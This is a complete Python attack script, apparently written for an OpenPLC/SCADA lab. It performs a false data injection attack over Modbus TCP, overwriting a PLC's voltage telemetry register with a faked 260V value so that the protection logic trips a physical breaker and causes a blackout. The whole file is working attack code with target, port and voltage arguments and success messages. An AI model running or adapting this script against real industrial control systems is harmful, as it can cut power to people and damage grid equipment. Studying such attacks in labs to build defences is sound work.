#!/usr/bin/env python3
"""
False Data Injection Attack (FDIA) - Overvoltage Spoofing

This script acts as a rogue actor on the SCADA network. It connects directly
to the OpenPLC Modbus TCP server and overwrites the parsed telemetry data
(%MW0 register) with a faked, dangerously high voltage (260V).

If the ST protection logic is active, this will trick the PLC into issuing
a false trip command to the physical breaker, causing a blackout.

Usage:
    python fdia_attack.py --target 127.0.0.1 --port 5020 --voltage 260
"""
import argparse
from pymodbus.client import ModbusTcpClient

def main():
    parser = argparse.ArgumentParser(description="Inject fake telemetry into OpenPLC Modbus registers.")
    parser.add_argument("--target", type=str, default="127.0.0.1", help="Target IED IP Address")
    parser.add_argument("--port", type=int, default=5020, help="Target IED Modbus Port (e.g., 5020 for IED 1)")
    parser.add_argument("--voltage", type=float, default=260.0, help="Fake voltage to inject (in Volts)")
    
    args = parser.parse_args()
    
    print(f"[*] Initiating FDIA against IED at {args.target}:{args.port}")
    
    client = ModbusTcpClient(args.target, port=args.port)
    if not client.connect():
        print("[-] FAILED: Could not connect to the Modbus server. Is the IED running?")
        return

    # Scale the voltage according to the Multiplier Method (x 100)
    scaled_voltage = int(args.voltage * 100)
    
    print(f"[*] Injecting scaled voltage value: {scaled_voltage} to Holding Register 0 (%MW0)")
    
    try:
        # Write to Modbus Holding Register 0
        response = client.write_register(0, scaled_voltage)
        
        if response.isError():
            print(f"[-] ERROR: Failed to write to register. {response}")
        else:
            print(f"[+] ATTACK SUCCESSFUL: Faked voltage telemetry set to {args.voltage}V")
            print("[+] The PLC protection logic should trigger a blackout immediately.")
            
    except Exception as e:
        print(f"[-] EXCEPTION during Modbus communication: {e}")
    finally:
        client.close()

if __name__ == "__main__":
    main()
